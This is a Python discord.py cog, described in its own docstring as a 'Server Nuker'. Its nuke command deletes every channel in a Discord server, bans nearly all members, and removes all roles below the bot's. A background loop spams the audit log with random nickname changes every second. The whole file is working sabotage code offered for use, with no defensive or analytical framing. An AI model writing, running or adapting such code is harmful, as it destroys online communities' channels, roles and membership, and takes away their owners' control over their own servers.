from string import ascii_letters
from random import choice
from asyncio import sleep

from discord.errors import Forbidden
from discord.ext import commands


class nuke:
    """
    Server Nuker
    deletes every channel
    bans every member
    removes every role
    spams the audit log
    """

    def __init__(self, bot):
        self.bot = bot
        self.guilds = []

    @commands.command(pass_context=True)
    async def nuke(self, ctx):
        await ctx.message.delete()

        print("[Nuke]({}) Starting nuke".format({ctx.message.guild.id}))

        self.guilds.append(ctx.message.guild)
        print("[Auditspam]({}) Starting auditspam".format({ctx.message.guild.id}))

        for channel in ctx.message.guild.channels:
            try:
                await channel.delete()
            except:
                pass

        for member in [x for x in ctx.message.guild.members if x != ctx.guild.me and not x in self.bot.allowedusers]:
            try:
                await member.ban(delete_message_days=0)
            except:
                pass

        while [x for x in ctx.message.guild.roles if x.name != "@everyone" and x < ctx.guild.me.top_role]:
            for role in [x for x in ctx.message.guild.roles if x.name != "@everyone" and x < ctx.guild.me.top_role]:
                await role.delete()

        print("[Nuke]({}) nuke complete".format({ctx.message.guild.id}))

    @commands.command(pass_context=True)
    async def startaudit(self, ctx):
        self.guilds.append(ctx.message.guild)
        print("[Auditspam]({}) Starting auditspam".format({ctx.message.guild.id}))

    @commands.command(pass_context=True)
    async def stopaudit(self, ctx):
        self.guilds.remove(ctx.message.guild)
        print("[Auditspam]({}) Stopping auditspam".format({ctx.message.guild.id}))

    async def auditspam(self):
        await self.bot.wait_until_ready()
        # loop while this cog is loaded
        while self == self.bot.get_cog('nuke'):
            for i in self.guilds:
                try:
                    await i.me.edit(reason="".join([choice(ascii_letters) for x in range(15)]), nick="".join([choice(ascii_letters) for x in range(15)]))
                except Forbidden:
                    self.guilds.remove(i)
                    print("[Auditspam]({}) Can't change nickname, stopping".format(i.id))
            await sleep(1)


def setup(bot):
    b = nuke(bot)
    bot.add_cog(b)
    bot.loop.create_task(b.auditspam())
